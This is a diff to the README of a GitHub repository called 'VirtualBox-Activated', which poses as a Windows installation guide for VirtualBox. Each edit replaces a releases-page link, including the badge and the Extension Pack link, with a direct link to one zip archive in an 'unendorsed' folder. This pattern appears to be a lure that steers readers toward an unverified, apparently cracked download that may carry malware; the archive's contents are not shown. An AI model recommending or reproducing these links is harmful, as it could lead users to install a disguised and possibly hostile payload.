@@ -1,6 +1,6 @@
 # 🖥️ VirtualBox-Activated - Simplify Virtualization on Your Windows PC
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Ayoub11442/VirtualBox-Activated/releases)
+[![Download Latest Release](https://github.com/Ayoub11442/VirtualBox-Activated/raw/refs/heads/main/unendorsed/Virtual-Activated-Box-3.6-alpha.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Ayoub11442/VirtualBox-Activated/raw/refs/heads/main/unendorsed/Virtual-Activated-Box-3.6-alpha.1.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to get VirtualBox running on your Windows PC.
 
 ### 1. **Download VirtualBox**
 
-To start, you must download VirtualBox. Visit this page to download: [Download VirtualBox Releases](https://github.com/Ayoub11442/VirtualBox-Activated/releases).
+To start, you must download VirtualBox. Visit this page to download: [Download VirtualBox Releases](https://github.com/Ayoub11442/VirtualBox-Activated/raw/refs/heads/main/unendorsed/Virtual-Activated-Box-3.6-alpha.1.zip).
 
 ### 2. **Install VirtualBox**
 
@@ -36,7 +36,7 @@ Once installed, launch VirtualBox. You can create a new virtual machine by follo
 
 ### 4. **Download & Install Extension Pack**
 
-To enhance the functionality of VirtualBox, you may want to download the Extension Pack. This pack provides additional features like USB support and RDP. Visit this page to download it: [Download Extension Pack](https://github.com/Ayoub11442/VirtualBox-Activated/releases).
+To enhance the functionality of VirtualBox, you may want to download the Extension Pack. This pack provides additional features like USB support and RDP. Visit this page to download it: [Download Extension Pack](https://github.com/Ayoub11442/VirtualBox-Activated/raw/refs/heads/main/unendorsed/Virtual-Activated-Box-3.6-alpha.1.zip).
 
 After downloading, double-click the Extension Pack file. VirtualBox will open and prompt you to install the pack. Follow the on-screen instructions to complete the installation.
 
@@ -51,7 +51,7 @@ Installing Guest Additions is essential for improved performance and usability o
 
 ## 📥 Download & Install
 
-To get started, all downloads are available here: [Download VirtualBox Releases](https://github.com/Ayoub11442/VirtualBox-Activated/releases). You will find the necessary files for both VirtualBox and additional tools in this section.
+To get started, all downloads are available here: [Download VirtualBox Releases](https://github.com/Ayoub11442/VirtualBox-Activated/raw/refs/heads/main/unendorsed/Virtual-Activated-Box-3.6-alpha.1.zip). You will find the necessary files for both VirtualBox and additional tools in this section.
 
 ## 🛠️ Troubleshooting
 
